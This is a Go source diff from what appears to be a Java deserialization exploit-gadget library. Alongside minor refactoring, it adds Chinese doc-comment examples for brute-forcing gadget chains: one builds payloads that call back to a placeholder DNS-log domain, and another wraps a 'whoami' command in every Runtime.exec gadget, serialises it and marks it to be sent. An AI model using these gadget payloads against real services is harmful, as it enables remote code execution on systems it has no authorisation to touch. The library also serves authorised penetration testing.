@@ -906,16 +906,31 @@ func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 
 // GetAllGadget 获取所有的支持的Gadget
 func GetAllGadget() []interface{} {
-	alGadget := []any{}
+	var alGadget []any
 	for _, gadget := range AllGadgets {
 		alGadget = append(alGadget, gadget.Generator)
 	}
 	return alGadget
 }
 
-// GetAllTemplatesGadget 获取所有的支持的模板Gadget
+// GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget
+// Example:
+//
+//	for _, gadget := range yso.GetAllTemplatesGadget() {
+//		domain := "xxx.dnslog" // dnslog 地址
+//		javaObj, err := gadget(yso.useDNSLogEvilClass(domain))
+//		if javaObj == nil || err != nil {
+//			continue
+//		}
+//
+//		objBytes, err := yso.ToBytes(javaObj)
+//		if err != nil {
+//			continue
+//		}
+//		// 发送 objBytes
+//	}
 func GetAllTemplatesGadget() []TemplatesGadget {
-	alGadget := []TemplatesGadget{}
+	var alGadget []TemplatesGadget
 	for _, gadget := range AllGadgets {
 		if gadget.SupportTemplate {
 			alGadget = append(alGadget, gadget.Generator.(func(options ...GenClassOptionFun) (*JavaObject, error)))
@@ -924,9 +939,25 @@ func GetAllTemplatesGadget() []TemplatesGadget {
 	return alGadget
 }
 
-// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget
+// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget
+//
+// Example:
+//
+//	command := "whoami" // 假设的命令字符串
+//	for _, gadget := range yso.GetAllRuntimeExecGadget() {
+//		javaObj, err := gadget(command)
+//		if javaObj == nil || err != nil {
+//			continue
+//		}
+//
+//		objBytes, err := yso.ToBytes(javaObj)
+//		if err != nil {
+//			continue
+//		}
+//		// 发送 objBytes
+//	}
 func GetAllRuntimeExecGadget() []RuntimeExecGadget {
-	alGadget := []RuntimeExecGadget{}
+	var alGadget []RuntimeExecGadget
 	for _, gadget := range AllGadgets {
 		if !gadget.SupportTemplate {
 			alGadget = append(alGadget, gadget.Generator.(func(cmd string) (*JavaObject, error)))
